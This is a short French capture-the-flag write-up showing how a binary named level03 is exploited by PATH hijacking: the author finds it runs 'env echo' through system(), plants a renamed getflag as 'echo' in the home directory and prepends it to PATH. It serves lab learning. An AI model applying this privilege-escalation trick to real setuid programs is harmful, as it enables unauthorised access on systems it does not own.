On se connecte on trouve un binaire `level03`

On l'execute et cela nous sort `Exploit me`

On fait un `nm` sur le binaire

```
08049f28 d _DYNAMIC
08049ff4 d _GLOBAL_OFFSET_TABLE_
080485dc R _IO_stdin_used
         w _Jv_RegisterClasses
08049f18 d __CTOR_END__
08049f14 d __CTOR_LIST__
08049f20 D __DTOR_END__
08049f1c d __DTOR_LIST__
080486f4 r __FRAME_END__
08049f24 d __JCR_END__
08049f24 d __JCR_LIST__
0804a024 A __bss_start
0804a01c D __data_start
08048590 t __do_global_ctors_aux
08048420 t __do_global_dtors_aux
0804a020 D __dso_handle
         w __gmon_start__
08048582 T __i686.get_pc_thunk.bx
08049f14 d __init_array_end
08049f14 d __init_array_start
08048580 T __libc_csu_fini
08048510 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
0804a024 A _edata
0804a02c A _end
080485bc T _fini
080485d8 R _fp_hw
08048340 T _init
080483f0 T _start
0804a024 b completed.6159
0804a01c W data_start
0804a028 b dtor_idx.6161
08048480 t frame_dummy
         U getegid@@GLIBC_2.0
         U geteuid@@GLIBC_2.0
080484a4 T main
         U setresgid@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U system@@GLIBC_2.0
         ```
Rien d'exploitable

On test donc avec `strings` 
Cette ligne la nous a fait tilte 
`/usr/bin/env echo Exploit me`

Avec l'env on utilise echo

Apres reflection
Si on renone getflag en echo et qu'on change le PATH ca pourrais fonctionne

On copie 
`getflag` dans le home et on le renome `echo`

On change le PATH avec 

```bash
export PATH=$HOME:$PATH
```
ce qui ajoute le home au debut du path, le shell va donc chercher les binaires en premier dans le home

on execute `./level03`

Ca marche !